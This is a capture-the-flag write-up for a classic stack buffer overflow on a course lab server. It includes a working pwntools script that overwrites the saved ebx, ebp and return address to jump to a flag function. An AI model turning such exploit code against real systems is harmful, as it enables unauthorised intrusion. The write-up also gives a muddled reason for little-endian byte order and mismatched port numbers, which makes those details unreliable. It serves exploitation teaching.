# Challenge `Super Secure System` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23154`
- Impact:
  - Allows attacker to control `return`s

## Steps to reproduce

1. The `return` of a function is controlled by the stored value of `eip`
2. In this version, we need to preserve the values of `ebp` and `ebx` (modyfying the last byte from `0x00` to `0x01`, since `strcpy` stops in the first zero) to ensure the correct execution
3. We can overflow the buffer enough to modify the memory of this stored value, while mantaining the values of the relevant registers
4. Since the stack is a `first-in-last-out (FILO)` structure, we need to write the bytes in `little-endian`

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23155", timeout=1000)

buffer_address = 0xffffcfc0
ebx_address = 0xffffcfe4
ebp_address = 0xffffcfe8
eip_address = 0xffffcfec

getflag_address = b'\xd9\x87\x04\x08'
ebp_value = b'\xe8\xcf\xff\xff'
ebx_value = b'\x01\xa0\x04\x08'

s = b"1"*(ebx_address - buffer_address)
s += ebx_value
s += ebp_value
s += b"1"*(eip_address - (ebp_address + 4))
s += getflag_address

session.send(s)
print(session.recvall())
```